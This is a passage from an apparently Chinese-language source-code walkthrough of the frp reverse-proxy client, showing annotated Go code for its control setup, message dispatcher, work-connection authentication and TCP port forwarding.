class="hljs-title">NewControl</span><span class="hljs-params">(ctx context.Context, sessionCtx *SessionContext)</span></span> (*Control, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// new xlog instance</span><br><span class="hljs-comment">// 控制器</span><br>ctl := &amp;Control&#123;<br>ctx:        ctx,<br>xl:         xlog.FromContextSafe(ctx),<br>sessionCtx: sessionCtx,<br>doneCh:     <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;),<br>&#125;<br><span class="hljs-comment">// 上次响应时间</span><br>ctl.lastPong.Store(time.Now())<br><span class="hljs-comment">// 消息调度器</span><br><span class="hljs-keyword">if</span> sessionCtx.ConnEncrypted &#123;<br><span class="hljs-comment">// 创建一个加解密的 io.ReadWriter</span><br><span class="hljs-comment">// []byte(sessionCtx.Common.Auth.Token) 是加解密的 Key</span><br>cryptoRW, err := netpkg.NewCryptoReadWriter(sessionCtx.Conn, []<span class="hljs-type">byte</span>(sessionCtx.Common.Auth.Token))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// 创建消息调度器</span><br>ctl.msgDispatcher = msg.NewDispatcher(cryptoRW)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ctl.msgDispatcher = msg.NewDispatcher(sessionCtx.Conn)<br>&#125;<br><span class="hljs-comment">// 注册一下各类消息的处理的各种 handler</span><br>ctl.registerMsgHandlers()<br><span class="hljs-comment">// 把消息调度器的 SendChannel 赋值到 ctl.msgTransporter 后续其他地方使用这个去发送消息</span><br>ctl.msgTransporter = transport.NewMessageTransporter(ctl.msgDispatcher.SendChannel())<br><span class="hljs-comment">// 新建代理管理器</span><br>ctl.pm = proxy.NewManager(ctl.ctx, sessionCtx.Common, ctl.msgTransporter)<br>ctl.vm = visitor.NewManager(ctl.ctx, sessionCtx.RunID, sessionCtx.Common, ctl.connectServer, ctl.msgTransporter)<br><span class="hljs-keyword">return</span> ctl, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="消息调度器"><a href="#消息调度器" class="headerlink" title="消息调度器"></a>消息调度器</h4><p>对发送和响应的处理。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">package</span> msg<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">AsyncHandler</span><span class="hljs-params">(f <span class="hljs-keyword">func</span>(Message)</span></span>) <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(Message)</span></span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(m Message)</span></span> &#123;<br><span class="hljs-keyword">go</span> f(m)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Dispatcher is used to send messages to net.Conn or register handlers for messages read from net.Conn.</span><br><span class="hljs-keyword">type</span> Dispatcher <span class="hljs-keyword">struct</span> &#123;<br>rw io.ReadWriter<br><br>sendCh         <span class="hljs-keyword">chan</span> Message<br>doneCh         <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br><span class="hljs-comment">// 对服务端响应消息的处理程序</span><br>msgHandlers    <span class="hljs-keyword">map</span>[reflect.Type]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(Message)</span></span><br>defaultHandler <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(Message)</span></span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewDispatcher</span><span class="hljs-params">(rw io.ReadWriter)</span></span> *Dispatcher &#123;<br><span class="hljs-keyword">return</span> &amp;Dispatcher&#123;<br>rw:          rw,<br>sendCh:      <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> Message, <span class="hljs-number">100</span>),<br>doneCh:      <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;),<br>msgHandlers: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[reflect.Type]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(Message)</span></span>),<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Run will block until io.EOF or some error occurs.</span><br><span class="hljs-comment">// 启动消息的发送和读取处理</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Dispatcher)</span></span> Run() &#123;<br><span class="hljs-keyword">go</span> d.sendLoop()<br><span class="hljs-keyword">go</span> d.readLoop()<br>&#125;<br><br><span class="hljs-comment">// sendLoop 发送消息</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Dispatcher)</span></span> sendLoop() &#123;<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-d.doneCh:<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> m := &lt;-d.sendCh:<br>_ = WriteMsg(d.rw, m)<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// readLoop 读取消息并根据消息类型使用不同的 handler 进行处理</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Dispatcher)</span></span> readLoop() &#123;<br><span class="hljs-keyword">for</span> &#123;<br>m, err := ReadMsg(d.rw)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">close</span>(d.doneCh)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> handler, ok := d.msgHandlers[reflect.TypeOf(m)]; ok &#123;<br>handler(m)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> d.defaultHandler != <span class="hljs-literal">nil</span> &#123;<br>d.defaultHandler(m)<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Send 封装的发送消息方法 把消息放到 sendCh</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Dispatcher)</span></span> Send(m Message) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-d.doneCh:<br><span class="hljs-keyword">return</span> io.EOF<br><span class="hljs-keyword">case</span> d.sendCh &lt;- m:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Dispatcher)</span></span> SendChannel() <span class="hljs-keyword">chan</span> Message &#123;<br><span class="hljs-keyword">return</span> d.sendCh<br>&#125;<br><br><span class="hljs-comment">// 注册消息处理程序</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Dispatcher)</span></span> RegisterHandler(msg Message, handler <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(Message)</span></span>) &#123;<br>d.msgHandlers[reflect.TypeOf(msg)] = handler<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Dispatcher)</span></span> RegisterDefaultHandler(handler <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(Message)</span></span>) &#123;<br>d.defaultHandler = handler<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Dispatcher)</span></span> Done() <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125; &#123;<br><span class="hljs-keyword">return</span> d.doneCh<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="消息处理-handlers"><a href="#消息处理-handlers" class="headerlink" title="消息处理 handlers"></a>消息处理 handlers</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> registerMsgHandlers() &#123;<br><span class="hljs-comment">// 请求工作连接</span><br>ctl.msgDispatcher.RegisterHandler(&amp;msg.ReqWorkConn&#123;&#125;, msg.AsyncHandler(ctl.handleReqWorkConn))<br><span class="hljs-comment">// 新建代理响应</span><br>ctl.msgDispatcher.RegisterHandler(&amp;msg.NewProxyResp&#123;&#125;, ctl.handleNewProxyResp)<br>ctl.msgDispatcher.RegisterHandler(&amp;msg.NatHoleResp&#123;&#125;, ctl.handleNatHoleResp)<br><span class="hljs-comment">// Pong</span><br>ctl.msgDispatcher.RegisterHandler(&amp;msg.Pong&#123;&#125;, ctl.handlePong)<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="msg-ReqWorkConn"><a href="#msg-ReqWorkConn" class="headerlink" title="msg.ReqWorkConn"></a>msg.ReqWorkConn</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">type</span> ReqWorkConn <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-keyword">type</span> NewWorkConn <span class="hljs-keyword">struct</span> &#123;<br>RunID        <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;run_id,omitempty&quot;`</span><br>PrivilegeKey <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;privilege_key,omitempty&quot;`</span><br>Timestamp    <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;timestamp,omitempty&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> StartWorkConn <span class="hljs-keyword">struct</span> &#123;<br>ProxyName <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;proxy_name,omitempty&quot;`</span><br>SrcAddr   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;src_addr,omitempty&quot;`</span><br>DstAddr   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;dst_addr,omitempty&quot;`</span><br>SrcPort   <span class="hljs-type">uint16</span> <span class="hljs-string">`json:&quot;src_port,omitempty&quot;`</span><br>DstPort   <span class="hljs-type">uint16</span> <span class="hljs-string">`json:&quot;dst_port,omitempty&quot;`</span><br>Error     <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;error,omitempty&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> handleReqWorkConn(_ msg.Message) &#123;<br>xl := ctl.xl<br><span class="hljs-comment">// 连接到服务端</span><br>workConn, err := ctl.connectServer()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;start new connection to server error: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 新建工作的消息</span><br>m := &amp;msg.NewWorkConn&#123;<br>RunID: ctl.sessionCtx.RunID,<br>&#125;<br><span class="hljs-comment">// 认证</span><br><span class="hljs-keyword">if</span> err = ctl.sessionCtx.AuthSetter.SetNewWorkConn(m); err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;error during NewWorkConn authentication: %v&quot;</span>, err)<br>workConn.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 发送消息</span><br><span class="hljs-keyword">if</span> err = msg.WriteMsg(workConn, m); err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;work connection write to server error: %v&quot;</span>, err)<br>workConn.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 接收服务端响应的开始工作的消息</span><br><span class="hljs-keyword">var</span> startMsg msg.StartWorkConn<br><span class="hljs-keyword">if</span> err = msg.ReadMsgInto(workConn, &amp;startMsg); err != <span class="hljs-literal">nil</span> &#123;<br>xl.Tracef(<span class="hljs-string">&quot;work connection closed before response StartWorkConn message: %v&quot;</span>, err)<br>workConn.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> startMsg.Error != <span class="hljs-string">&quot;&quot;</span> &#123;<br>xl.Errorf(<span class="hljs-string">&quot;StartWorkConn contains error: %s&quot;</span>, startMsg.Error)<br>workConn.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// dispatch this work connection to related proxy</span><br><span class="hljs-comment">// 把这个工作连接分给相关代理使用</span><br>ctl.pm.HandleWorkConn(startMsg.ProxyName, workConn, &amp;startMsg)<br>&#125;<br><br><br><span class="hljs-comment">// connectServer return a new connection to frps</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> connectServer() (net.Conn, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> ctl.sessionCtx.Connector.Connect()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(auth *TokenAuthSetterVerifier)</span></span> SetNewWorkConn(newWorkConnMsg *msg.NewWorkConn) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> !slices.Contains(auth.additionalAuthScopes, v1.AuthScopeNewWorkConns) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br>newWorkConnMsg.Timestamp = time.Now().Unix()<br>newWorkConnMsg.PrivilegeKey = util.GetAuthKey(auth.token, newWorkConnMsg.Timestamp)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 连接分配给代理</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pm *Manager)</span></span> HandleWorkConn(name <span class="hljs-type">string</span>, workConn net.Conn, m *msg.StartWorkConn) &#123;<br>pm.mu.RLock()<br>pw, ok := pm.proxies[name]<br>pm.mu.RUnlock()<br><span class="hljs-keyword">if</span> ok &#123;<br>pw.InWorkConn(workConn, m)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>workConn.Close()<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pw *Wrapper)</span></span> InWorkConn(workConn net.Conn, m *msg.StartWorkConn) &#123;<br>xl := pw.xl<br>pw.mu.RLock()<br>pxy := pw.pxy<br>pw.mu.RUnlock()<br><span class="hljs-comment">// 工作状态 Running </span><br><span class="hljs-keyword">if</span> pxy != <span class="hljs-literal">nil</span> &amp;&amp; pw.Phase == ProxyPhaseRunning &#123;<br>xl.Debugf(<span class="hljs-string">&quot;start a new work connection, localAddr: %s remoteAddr: %s&quot;</span>, workConn.LocalAddr().String(), workConn.RemoteAddr().String())<br><span class="hljs-keyword">go</span> pxy.InWorkConn(workConn, m)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>workConn.Close()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>go pxy.InWorkConn(workConn, m)</code>​</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20241206095017-hhbt0ak-1749357007966129.png?imageSlim" alt="image-20241206095017-hhbt0ak"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pxy *BaseProxy)</span></span> InWorkConn(conn net.Conn, m *msg.StartWorkConn) &#123;<br><span class="hljs-keyword">if</span> pxy.inWorkConnCallback != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> !pxy.inWorkConnCallback(pxy.baseCfg, conn, m) &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 处理 TCP 的工作连接</span><br>pxy.HandleTCPWorkConnection(conn, m, []<span class="hljs-type">byte</span>(pxy.clientCfg.Auth.Token))<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pxy *BaseProxy)</span></span> HandleTCPWorkConnection(workConn net.Conn, m *msg.StartWorkConn, encKey []<span class="hljs-type">byte</span>) &#123;<br>xl := pxy.xl<br>baseCfg := pxy.baseCfg<br><span class="hljs-keyword">var</span> (<br>remote io.ReadWriteCloser<br>err    <span class="hljs-type">error</span><br>)<br><span class="hljs-comment">// 把工作连接 net.Conn 给 remote io.ReadWriteCloser</span><br><span class="hljs-comment">// net.Conn 实现了 io.ReadWriteCloser 接口 =&gt; Reader Writer Closer</span><br>remote = workConn<br><span class="hljs-keyword">if</span> pxy.limiter != <span class="hljs-literal">nil</span> &#123;<br>remote = libio.WrapReadWriteCloser(limit.NewReader(workConn, pxy.limiter), limit.NewWriter(workConn, pxy.limiter), <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> workConn.Close()<br>&#125;)<br>&#125;<br><br>xl.Tracef(<span class="hljs-string">&quot;handle tcp work connection, useEncryption: %t, useCompression: %t&quot;</span>,<br>baseCfg.Transport.UseEncryption, baseCfg.Transport.UseCompression)<br><span class="hljs-comment">// 加密</span><br><span class="hljs-keyword">if</span> baseCfg.Transport.UseEncryption &#123;<br>remote, err = libio.WithEncryption(remote, encKey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>workConn.Close()<br>xl.Errorf(<span class="hljs-string">&quot;create encryption stream error: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 压缩</span><br><span class="hljs-keyword">var</span> compressionResourceRecycleFn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br><span class="hljs-keyword">if</span> baseCfg.Transport.UseCompression &#123;<br>remote, compressionResourceRecycleFn = libio.WithCompressionFromPool(remote)<br>&#125;<br><br><span class="hljs-comment">// check if we need to send proxy protocol info</span><br><span class="hljs-comment">// 检查代理信息 源地址和源端口</span><br><span class="hljs-keyword">var</span> extraInfo plugin.ExtraInfo<br><span class="hljs-keyword">if</span> m.SrcAddr != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; m.SrcPort != <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">if</span> m.DstAddr == <span class="hljs-string">&quot;&quot;</span> &#123;<br>m.DstAddr = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>&#125;<br>srcAddr, _ := net.ResolveTCPAddr(<span class="hljs-string">&quot;tcp&quot;</span>, net.JoinHostPort(m.SrcAddr, strconv.Itoa(<span class="hljs-type">int</span>(m.SrcPort))))<br>dstAddr, _ := net.ResolveTCPAddr(<span class="hljs-string">&quot;tcp&quot;</span>, net.JoinHostPort(m.DstAddr, strconv.Itoa(<span class="hljs-type">int</span>(m.DstPort))))<br>extraInfo.SrcAddr = srcAddr<br>extraInfo.DstAddr = dstAddr<br>&#125;<br><br><span class="hljs-keyword">if</span> baseCfg.Transport.ProxyProtocolVersion != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; m.SrcAddr != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; m.SrcPort != <span class="hljs-number">0</span> &#123;<br>h := &amp;pp.Header&#123;<br>Command:         pp.PROXY,<br>SourceAddr:      extraInfo.SrcAddr,<br>DestinationAddr: extraInfo.DstAddr,<br>&#125;<br><br><span class="hljs-keyword">if</span> strings.Contains(m.SrcAddr, <span class="hljs-string">&quot;.&quot;</span>) &#123;<br>h.TransportProtocol = pp.TCPv4<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>h.TransportProtocol = pp.TCPv6<br>&#125;<br><br><span class="hljs-keyword">if</span> baseCfg.Transport.ProxyProtocolVersion == <span class="hljs-string">&quot;v1&quot;</span> &#123;<br>h.Version = <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> baseCfg.Transport.ProxyProtocolVersion == <span class="hljs-string">&quot;v2&quot;</span> &#123;<br>h.Version = <span class="hljs-number">2</span><br>&#125;<br>extraInfo.ProxyProtocolHeader = h<br>&#125;<br><span class="hljs-comment">// 使用插件处理</span><br><span class="hljs-keyword">if</span> pxy.proxyPlugin != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// if plugin is set, let plugin handle connection first</span><br>xl.Debugf(<span class="hljs-string">&quot;handle by plugin: %s&quot;</span>, pxy.proxyPlugin.Name())<br>pxy.proxyPlugin.Handle(pxy.ctx, remote, workConn, &amp;extraInfo)<br>xl.Debugf(<span class="hljs-string">&quot;handle by plugin finished&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 非插件处理</span><br><span class="hljs-comment">// 和本地要转发的端口连接连接 =&gt; 本地连接</span><br>localConn, err := libnet.Dial(<br>net.JoinHostPort(baseCfg.LocalIP, strconv.Itoa(baseCfg.LocalPort)),<br>libnet.WithTimeout(<span class="hljs-number">10</span>*time.Second),<br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>workConn.Close()<br>xl.Errorf(<span class="hljs-string">&quot;connect to local service [%s:%d] error: %v&quot;</span>, baseCfg.LocalIP, baseCfg.LocalPort, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>xl.Debugf(<span class="hljs-string">&quot;join connections, localConn(l[%s] r[%s]) workConn(l[%s] r[%s])&quot;</span>, localConn.LocalAddr().String(),<br>localConn.RemoteAddr().String(), workConn.LocalAddr().String(), workConn.RemoteAddr().String())<br><br><span class="hljs-keyword">if</span> extraInfo.ProxyProtocolHeader != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> _, err := extraInfo.ProxyProtocolHeader.WriteTo(localConn); err != <span class="hljs-literal">nil</span> &#123;<br>workConn.Close()<br>xl.Errorf(<span class="hljs-string">&quot;write proxy protocol header to local conn error: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 本地连接 &lt;=&gt; 远程连接 实现端口转发功能</span><br>_, _, errs := libio.Join(localConn, remote)<br>xl.Debugf(<span class="hljs-string">&quot;join connections closed&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(errs) &gt; <span class="hljs-number">0</span> &#123;<br>xl.Tracef(<span class="hljs-string">&quot;join connections errors: %v&quot;</span>, errs)<br>&#125;<br><span class="hljs-comment">// 压缩</span><br><span class="hljs-keyword">if</span> compressionResourceRecycleFn != <span class="hljs-literal">nil</span> 